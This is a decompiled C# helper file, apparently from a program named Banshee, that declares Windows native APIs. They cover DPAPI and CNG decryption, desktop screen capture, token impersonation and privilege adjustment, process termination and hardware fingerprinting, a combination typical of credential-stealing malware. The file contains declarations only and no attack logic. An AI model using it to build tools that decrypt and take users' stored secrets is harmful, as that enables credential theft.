﻿using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Banshee.Helper
{
	// Token: 0x020000B6 RID: 182
	public static class NativeMethods
	{
		// Token: 0x06000239 RID: 569
		[DllImport("psapi.dll", SetLastError = true)]
		public static extern bool GetProcessMemoryInfo(IntPtr hProcess, out NativeMethods.PROCESS_MEMORY_COUNTERS_EX ppsmemCounters, uint cb);

		// Token: 0x0600023A RID: 570
		[DllImport("psapi.dll", SetLastError = true)]
		public static extern bool EnumProcesses([Out] uint[] lpidProcess, uint cb, out uint lpcbNeeded);

		// Token: 0x0600023B RID: 571
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

		// Token: 0x0600023C RID: 572
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

		// Token: 0x0600023D RID: 573
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetVolumeInformation(string lpRootPathName, StringBuilder lpVolumeNameBuffer, int nVolumeNameSize, out uint lpVolumeSerialNumber, out uint lpMaximumComponentLength, out uint lpFileSystemFlags, StringBuilder lpFileSystemNameBuffer, int nFileSystemNameSize);

		// Token: 0x0600023E RID: 574
		[DllImport("kernel32.dll")]
		public static extern bool GlobalMemoryStatusEx(ref NativeMethods.MEMORYSTATUSEX lpBuffer);

		// Token: 0x0600023F RID: 575
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		public static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref NativeMethods.DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

		// Token: 0x06000240 RID: 576
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		// Token: 0x06000241 RID: 577
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool QueryFullProcessImageName(IntPtr hProcess, int dwFlags, StringBuilder lpExeName, ref int lpdwSize);

		// Token: 0x06000242 RID: 578
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, int dwFlags);

		// Token: 0x06000243 RID: 579
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, int dwLegacyKeySpec, int dwFlags);

		// Token: 0x06000244 RID: 580
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

		// Token: 0x06000245 RID: 581
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptFreeObject(IntPtr hObject);

		// Token: 0x06000246 RID: 582
		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();

		// Token: 0x06000247 RID: 583
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowDC(IntPtr hWnd);

		// Token: 0x06000248 RID: 584
		[DllImport("user32.dll")]
		public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x06000249 RID: 585
		[DllImport("gdi32.dll")]
		public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

		// Token: 0x0600024A RID: 586
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		// Token: 0x0600024B RID: 587
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool QueryFullProcessImageName(IntPtr hProcess, int dwFlags, StringBuilder exeName, ref uint lpdwSize);

		// Token: 0x0600024C RID: 588
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x0600024D RID: 589
		[DllImport("crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CryptUnprotectData(ref NativeMethods.DataBlob pDataIn, ref string ppszDataDescr, ref NativeMethods.DataBlob pOptionalEntropy, IntPtr pvReserved, ref NativeMethods.CryptprotectPromptstruct pPromptStruct, int dwFlags, ref NativeMethods.DataBlob pDataOut);

		// Token: 0x0600024E RID: 590
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

		// Token: 0x0600024F RID: 591
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

		// Token: 0x06000250 RID: 592
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

		// Token: 0x06000251 RID: 593
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool RevertToSelf();

		// Token: 0x06000252 RID: 594
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref NativeMethods.LUID lpLuid);

		// Token: 0x06000253 RID: 595
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref NativeMethods.TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

		// Token: 0x06000254 RID: 596
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetCurrentProcess();

		// Token: 0x020000B7 RID: 183
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct CryptprotectPromptstruct
		{
			// Token: 0x040001A2 RID: 418
			public int cbSize;

			// Token: 0x040001A3 RID: 419
			public int dwPromptFlags;

			// Token: 0x040001A4 RID: 420
			public IntPtr hwndApp;

			// Token: 0x040001A5 RID: 421
			public string szPrompt;
		}

		// Token: 0x020000B8 RID: 184
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DataBlob
		{
			// Token: 0x040001A6 RID: 422
			public int cbData;

			// Token: 0x040001A7 RID: 423
			public IntPtr pbData;
		}

		// Token: 0x020000B9 RID: 185
		public struct LUID
		{
			// Token: 0x040001A8 RID: 424
			public uint LowPart;

			// Token: 0x040001A9 RID: 425
			public int HighPart;
		}

		// Token: 0x020000BA RID: 186
		public struct TOKEN_PRIVILEGES
		{
			// Token: 0x040001AA RID: 426
			public uint PrivilegeCount;

			// Token: 0x040001AB RID: 427
			public NativeMethods.LUID Luid;

			// Token: 0x040001AC RID: 428
			public uint Attributes;
		}

		// Token: 0x020000BB RID: 187
		public struct MEMORYSTATUSEX
		{
			// Token: 0x040001AD RID: 429
			public uint dwLength;

			// Token: 0x040001AE RID: 430
			public uint dwMemoryLoad;

			// Token: 0x040001AF RID: 431
			public ulong ullTotalPhys;

			// Token: 0x040001B0 RID: 432
			public ulong ullAvailPhys;

			// Token: 0x040001B1 RID: 433
			public ulong ullTotalPageFile;

			// Token: 0x040001B2 RID: 434
			public ulong ullAvailPageFile;

			// Token: 0x040001B3 RID: 435
			public ulong ullTotalVirtual;

			// Token: 0x040001B4 RID: 436
			public ulong ullAvailVirtual;

			// Token: 0x040001B5 RID: 437
			public ulong ullAvailExtendedVirtual;
		}

		// Token: 0x020000BC RID: 188
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DISPLAY_DEVICE
		{
			// Token: 0x040001B6 RID: 438
			public int cb;

			// Token: 0x040001B7 RID: 439
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string DeviceName;

			// Token: 0x040001B8 RID: 440
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceString;

			// Token: 0x040001B9 RID: 441
			public uint StateFlags;

			// Token: 0x040001BA RID: 442
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceID;

			// Token: 0x040001BB RID: 443
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceKey;
		}

		// Token: 0x020000BD RID: 189
		public struct PROCESS_MEMORY_COUNTERS_EX
		{
			// Token: 0x040001BC RID: 444
			public uint cb;

			// Token: 0x040001BD RID: 445
			public uint PageFaultCount;

			// Token: 0x040001BE RID: 446
			public UIntPtr PeakWorkingSetSize;

			// Token: 0x040001BF RID: 447
			public UIntPtr WorkingSetSize;

			// Token: 0x040001C0 RID: 448
			public UIntPtr QuotaPeakPagedPoolUsage;

			// Token: 0x040001C1 RID: 449
			public UIntPtr QuotaPagedPoolUsage;

			// Token: 0x040001C2 RID: 450
			public UIntPtr QuotaPeakNonPagedPoolUsage;

			// Token: 0x040001C3 RID: 451
			public UIntPtr QuotaNonPagedPoolUsage;

			// Token: 0x040001C4 RID: 452
			public UIntPtr PagefileUsage;

			// Token: 0x040001C5 RID: 453
			public UIntPtr PeakPagefileUsage;

			// Token: 0x040001C6 RID: 454
			public UIntPtr PrivateUsage;
		}
	}
}
